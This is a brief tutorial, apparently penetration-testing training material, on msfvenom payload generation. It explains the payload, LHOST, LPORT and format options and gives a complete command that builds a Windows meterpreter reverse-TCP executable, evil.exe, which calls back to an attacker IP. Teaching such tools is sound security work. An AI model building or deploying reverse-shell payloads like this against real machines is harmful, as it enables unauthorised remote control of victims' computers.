`msfvenom` Payload Generation Basics

Understanding the essential parameters for crafting a payload.

`-p `: Specifies the payload type (e.g., `windows/meterpreter/reverse_tcp`).

`LHOST=`: Your attacking machine's IP address for the reverse connection.

`LPORT=`: The listening port on your attacking machine.

`-f `: Specifies the output format (e.g., `exe`, `vba`, `raw`).

Key Takeaway

Correctly configuring payload parameters is crucial for successful remote connection and exploitation.

kali@attacker:~
# Example: Windows Reverse TCP Executable
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=192.168.1.100 \
         LPORT=4444 \
         -f exe \
         -o /root/Desktop/evil.exe

# Explanation of parameters:
# -p: Defines the payload
# LHOST: Attacker's IP
# LPORT: Attacker's listening port
# -f: Output file format
# -o: Output file path
Pro Tip

Always verify your Kali machine's IP address using `ip a` before setting `LHOST`.
